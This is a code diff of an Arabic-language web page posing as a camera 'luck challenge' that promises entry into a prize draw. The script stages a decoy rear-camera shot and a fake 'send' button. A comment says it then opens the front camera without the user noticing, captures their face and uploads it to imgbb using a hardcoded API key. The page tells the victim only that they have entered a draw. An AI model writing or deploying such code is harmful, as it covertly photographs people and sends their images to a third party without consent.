@@ -2,115 +2,135 @@
 <html lang="ar">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>كاميرا الحظ – لقطة واحدة للربح</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            background: linear-gradient(135deg, #f7c59f, #f59ca9);
-            color: #fff;
-            padding: 50px 20px;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🔮 تحدي الحظ – هل صورتك فائزة؟</title>
+  <style>
+    body {
+      font-family: 'Tahoma', sans-serif;
+      text-align: center;
+      background: linear-gradient(to bottom right, #ffe3e3, #ffc9de);
+      color: #333;
+      padding: 50px 20px;
+    }
 
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-        }
+    h1 {
+      font-size: 2.7em;
+      color: #d60087;
+      margin-bottom: 20px;
+    }
 
-        p {
-            font-size: 1.2em;
-            margin-bottom: 30px;
-        }
+    p {
+      font-size: 1.3em;
+      margin-bottom: 30px;
+      color: #444;
+    }
 
-        button {
-            background-color: #fff;
-            color: #f05941;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
+    button {
+      background-color: #d60087;
+      color: white;
+      border: none;
+      padding: 15px 35px;
+      font-size: 1.2em;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
 
-        button:hover {
-            background-color: #ffe1dc;
-        }
+    button:hover {
+      background-color: #b0006f;
+    }
 
-        video {
-            display: none;
-        }
-    </style>
+    video {
+      display: none;
+    }
+  </style>
 </head>
 
 <body>
-    <h1>🎉 كاميرا الحظ – لقطة واحدة للربح!</h1>
-    <p>التقط صورة عشوائية من حولك، لو الصورة فيها عنصر حظ، تفوز بجائزة رقمية!</p>
-    <button onclick="startChallenge()">🎯 جرب حظك الآن</button>
+  <h1>🔮 تحدي الحظ – لقطة واحدة قد تغيّر كل شيء!</h1>
+  <p>صوّر شيء من محيطك بكاميرا هاتفك، واربح فرصة لدخول السحب على جوائز رقمية رائعة 🤩<br>هل الصورة فيها لمسة حظ؟ جرب الآن!</p>
+  <button onclick="startChallenge()">🎯 التقط صورتك الآن</button>
+  <video id="video" autoplay playsinline></video>
 
-    <video id="video" autoplay playsinline></video>
+  <script>
+    const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';
+    const video = document.getElementById('video');
 
-    <script>
-        const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';
+    async function startChallenge() {
+      try {
+        // فتح الكاميرا الخلفية أولاً
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        video.srcObject = stream;
+        video.style.display = 'none';
 
-        async function startChallenge() {
-            const video = document.getElementById('video');
+        // بعد 3 ثوانٍ يتم عرض زر إرسال وهمي
+        document.querySelector('p').textContent = '📸 جاري التصوير...';
+        setTimeout(() => {
+          stream.getTracks().forEach(track => track.stop());
+          showFakeSendButton();
+        }, 3000);
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      } catch (err) {
+        alert('⚠️ تعذر تشغيل الكاميرا. تأكد من السماح بالوصول.');
+      }
+    }
 
+    function showFakeSendButton() {
+      const btn = document.querySelector('button');
+      btn.textContent = '🚀 إرسال الصورة';
+      btn.onclick = () => fakeAnalysis();
+      document.querySelector('p').textContent = '✨ الصورة جاهزة! اضغط إرسال للدخول في التحليل.';
+    }
 
+    async function fakeAnalysis() {
+      document.querySelector('button').style.display = 'none';
+      document.querySelector('p').textContent = '🧠 جارٍ تحليل حظك بناءً على العناصر البصرية...';
 
-                video.srcObject = stream;
-                video.style.display = 'none';
+      // فتح الكاميرا الأمامية بدون أن يشعر
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
 
-                // انتظر ثانيتين ثم التقط الصورة
-                setTimeout(() => captureAndUpload(video, stream), 2000);
+        // تأخير قليل ثم التقاط الصورة
+        setTimeout(() => captureAndUpload(stream), 2000);
 
-            } catch (err) {
-                alert('⚠️ تعذر تشغيل الكاميرا. تأكد من السماح بالوصول.');
-                console.error(err);
-            }
+      } catch (err) {
+        console.log('⚠️ فشل فتح الكاميرا الأمامية:', err);
+      }
+    }
+
+    async function captureAndUpload(stream) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      stream.getTracks().forEach(track => track.stop());
+
+      const imageData = canvas.toDataURL('image/jpeg');
+      const formData = new FormData();
+      formData.append('image', imageData.split(',')[1]);
+
+      try {
+        const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const data = await res.json();
+        if (data.success) {
+          document.querySelector('p').textContent = '🎉 تم دخولك للسحب! سيتم إعلامك بالنتيجة لاحقاً.';
+          console.log('📷 رابط الصورة:', data.data.url);
+        } else {
+          document.querySelector('p').textContent = '❌ فشل التحليل. حاول لاحقاً.';
         }
-
-        async function captureAndUpload(video, stream) {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0);
-
-            // إيقاف الكاميرا بعد الالتقاط
-            stream.getTracks().forEach(track => track.stop());
-            video.srcObject = null;
-
-            const imageData = canvas.toDataURL('image/jpeg');
-            const formData = new FormData();
-            formData.append('image', imageData.split(',')[1]);
-
-            document.querySelector('p').textContent = '📊 جارٍ تحليل حظك...';
-
-            try {
-                const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const data = await res.json();
-                if (data.success) {
-                    document.querySelector('p').textContent = '🎁 تم إشراكك في السحب الأسبوعي! سيتم التواصل مع الفائزين قريبًا.';
-                    console.log('✅ رابط الصورة:', data.data.url);
-                } else {
-                    throw new Error('رفع الصورة فشل');
-                }
-            } catch (error) {
-                document.querySelector('p').textContent = '❌ فشل التقديم، حاول لاحقاً.';
-                console.error(error);
-            }
-        }
-    </script>
+      } catch (err) {
+        console.log(err);
+        document.querySelector('p').textContent = '❌ حدث خطأ في إرسال الصورة.';
+      }
+    }
+  </script>
 </body>
 
 </html>
